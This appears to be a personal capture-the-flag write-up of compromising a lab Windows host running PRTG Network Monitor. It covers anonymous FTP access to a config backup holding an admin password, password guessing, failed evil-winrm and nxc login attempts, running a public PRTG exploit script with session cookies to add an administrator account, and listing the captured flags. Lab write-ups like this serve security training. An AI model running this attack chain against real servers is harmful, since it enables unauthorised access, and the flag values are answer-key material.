


# NMAP 

![[Pasted image 20251212014605.png]]

* it shows FTP on port 21 can be accessed anonymously. 
* port 80 is hosting a website too: 


![[Pasted image 20251212014754.png]]


# PLAN A:

Access FTP anonymous and check configs of the website - hunt for creds

### Creds was found in C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak

```powershell

	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
	      
	      
```


# Try the password on the website:

-   `PrTg@dmin2018` fails but   `PrTg@dmin2019` works. 


# Failed Attempts

```powershell

# Failed: 
evil-winrm -i '10.129.230.176' -u 'prtgadmin' -p 'PrTg@dmin2018' 

# Failed

nxc smb 10.129.230.176 -u 'prtgadmin' -p 'PrTg@dmin2018'  --shares
```


# Search for  known exploits

![[Pasted image 20251211222519.png]]



# Fix the exploit according to the provided instructions:

```powershell
# get the cookie values after authenticating to the webserver:
./46527.sh -u http://10.129.230.176 -c "_ga=GA1.4.964298405.1765506597; _gid=GA1.4.218903026.1765506597; OCTOPUS1813713946=ezg4REI1NTJDLUU5OEUtNEFEOS1BQjVDLUVBNzE1NEYxMUExMX0%3D; _gat=1"
```


# Run the exploit

It creates a new nt authority user with creds: `pentest:P3nT3st!`

Since nmap showed port 5985 is open, we can use the creds and evil-winrm to connect:

![[Pasted image 20251211223916.png]]

# Get the flags: 

![[Pasted image 20251212010801.png]]


# Flags:

```powershell
User Flag: d511a46fbcd22123abb216d3ed4f7276
Root Flag: 3501c6d1d7d741f0248b341b3251197c
```
# TODO

- FTP enum
- Exploit notification system + nishang
- xclip 
- 